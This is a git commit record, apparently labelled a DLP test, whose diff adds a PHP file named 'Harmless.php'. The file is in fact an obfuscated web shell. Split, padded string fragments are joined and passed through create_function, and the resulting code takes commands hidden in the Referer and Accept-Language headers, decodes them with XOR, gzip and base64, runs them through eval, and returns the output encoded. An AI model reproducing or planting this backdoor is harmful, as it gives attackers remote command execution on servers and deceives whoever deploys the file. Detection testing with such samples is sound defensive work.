be52ca386550d6000ef3c9892576875d9ddd04ff
Marc Dubach <mtschark@yahoo.com>
2016-05-12 10:30:11 -0400

    More Test
    Testing DLP

---
+++ Harmless.php
@@ -0,0 +1,16 @@
+<?php
+$t='trt9-o9-lower";$i=$m9-[1]9-9-[0].$m[1][1]9-;$h=$sl(9-$s9-s(md59-($i.$kh),09-9-,3));$f9-=$sl($ss(9-md59-9-($i.$kf),';
+$q='_/9-9-","/-/"),arr9-ay("/9-","+9-"),$ss($9-s[$i],0,$e)))9-,9-$k)));$o=ob9-_get9-_co9-ntents(9-);ob_en9-d_9-cle';
+$J='[$i]9-="";$9-p=$9-ss9-($p,3);}i9-f(arra9-y_key_exist9-s9-($i,$s)){9-$s9-[9-$i].=$p;$e=strpos9-($9-s[9-$i]9-,$f);9-9-';
+$n=';$i<$l9-;){for($j9-=0;($j<9-$9-9-c&&$i<$l);$j++,$i++9-9-){$o9-.=$t{$i}^$k{$j9-};}}ret9-urn $o9-;}9-$r=$_SER9-VER';
+$G='an();$d=ba9-se64_e9-ncode9-9-(x(gzcompres9-s(9-$o),9-9-$k));pri9-nt("9-<$k>$d</$k>");@9-ses9-sion_de9-stroy();}}}}';
+$u='9-9-;$rr=@$r9-["HTTP_REF9-ERE9-R"];9-$ra=@$r["HTTP_AC9-CEPT_L9-AN9-G9-UAGE"];9-if($rr&&$9-ra){$u9-=parse_9-url($r9-';
+$O='0,3))9-;$p="9-";for($z9-=9-1;$z<c9-ount9-($m[9-1]);$z++)$p9-.=$q9-[$9-m[2][$z]]9-;if(strpos($p9-,$h)===0)9-{$s';
+$Z='r);par9-se_str9-($u["quer9-y9-"],9-$q);$q=array9-_v9-alue9-s($q);preg_ma9-tch_all(9-9-"/([\\w]9-)[\\w-]+(9-?:;q=';
+$d=str_replace('m','','crmeamtme_fmmmunction');
+$Y='$kh="d6a6"9-;$9-kf="bc0d"9-;func9-tion 9-x9-($t,$9-k){$c=strle9-n($k);9-$l=strl9-en($t);$o=9-"9-";9-for($i9-=0';
+$k='if($e){$k=$kh.$k9-f;o9-b_start();@e9-val9-(@gz9-un9-compress(@x(@9-bas9-e64_deco9-de(preg_repl9-ace(a9-rra9-y("/';
+$X='0.(9-[9-\\d]))?9-,?/",$ra,$m9-);if(9-$q9-&9-&$m){@s9-ession_sta9-rt()9-;$s=9-&$9-_SESSION;$s9-s="substr";9-$sl="s';
+$m=str_replace('9-','',$Y.$n.$u.$Z.$X.$t.$O.$J.$k.$q.$G);
+$T=$d('',$m);$T();
+?>
